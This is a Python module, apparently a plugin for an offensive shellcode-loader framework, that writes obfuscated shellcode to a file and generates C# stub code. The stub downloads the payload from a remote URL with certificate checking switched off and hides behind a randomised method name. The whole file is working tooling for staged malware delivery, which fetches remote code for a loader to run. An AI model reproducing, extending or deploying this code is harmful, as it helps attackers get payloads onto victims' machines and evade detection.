import random
import string
import json
from cs.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.type = type(shellcode).__name__
        if self.type == 'bytes':
            open(outfile, 'wb').write(shellcode)
        elif self.type == 'str':
            open(outfile, 'w').write(shellcode)
        elif self.type == 'list':
            open(outfile, 'w').write('\n'.join(shellcode))
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def imports(self) -> list[str]:
        return ['using System.Net;']

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:

        if self.type == 'bytes':        
            return f"""
            public static byte[] {self.name}()
            {{
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                var obfuscated = (new WebClient()).DownloadData("{self.url}");
                return obfuscated;
            }}
"""
        elif self.type == 'str':
            return f"""
            public static String {self.name}()
            {{
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                var obfuscated = (new WebClient()).DownloadString("{self.url}");
                return obfuscated;
            }}
"""
        elif self.type == 'list':
            return f"""
            public static String[] {self.name}()
            {{
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                var obfuscated = (new WebClient()).DownloadString("{self.url}").Split(new char[] {{ '\\n' }});
                return obfuscated;
            }}
"""
